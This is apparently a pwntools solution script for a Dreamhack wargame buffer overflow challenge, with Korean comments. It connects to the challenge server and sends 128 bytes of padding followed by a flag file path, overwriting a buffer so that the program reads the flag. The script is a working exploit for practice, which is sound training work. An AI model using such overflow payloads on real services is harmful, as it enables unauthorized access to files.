from pwn import *

p = remote("host3.dreamhack.games", 18834)

# 패딩 추가
code =b'A'*128
code+= b'/home/bof/flag'
#code+=p64(0x\cat\flag);
#"\xbe\xba\xfe\xca";
# buf_address를 리틀 엔디안 형식으로 추가
#print(code)
p.sendlineafter(b'meow? ',code)
p.interactive()
